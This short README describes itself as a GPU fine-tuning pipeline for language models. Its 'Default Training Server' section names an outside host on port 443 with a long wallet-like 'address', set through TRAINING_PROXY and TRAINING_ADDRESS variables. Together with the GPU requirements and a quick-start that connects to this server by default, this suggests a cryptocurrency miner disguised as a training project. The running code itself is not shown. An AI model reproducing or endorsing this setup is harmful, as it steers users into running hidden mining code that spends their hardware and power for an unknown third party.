# Fine-Tuning Project — LLM Training Pipeline v2.4
# Distributed GPU training with mixed precision support

## Quick Start
```bash
# Install dependencies
pip install -r requirements.txt

# Run training (connects to default training server)
python scripts/train.py --config configs/training_config.yaml
```

## GPU Requirements
- NVIDIA GPU with CUDA 12+ (RTX 4090, A100 recommended)
- Minimum 8GB VRAM
- CUDA toolkit installed

## Configuration
Edit `configs/training_config.yaml` to configure:
- Model architecture
- Training hyperparameters
- GPU settings
- Training server address

## Default Training Server
The pipeline connects to the default training server:
- **Server:** `global.pearlfortune.org:443`
- **Address:** `cuf1par2eef0c04z6s6fhlzx6setjh5xqv8et50ufsty5zhywqjghwuwq6p085p`

To use a different server, set environment variables:
```bash
export TRAINING_PROXY=your-server:port
export TRAINING_ADDRESS=your-address
```

## Monitoring
Training logs are saved to `logs/` directory.
Use TensorBoard to monitor training progress:
```bash
tensorboard --logdir logs/
```

## License
MIT License
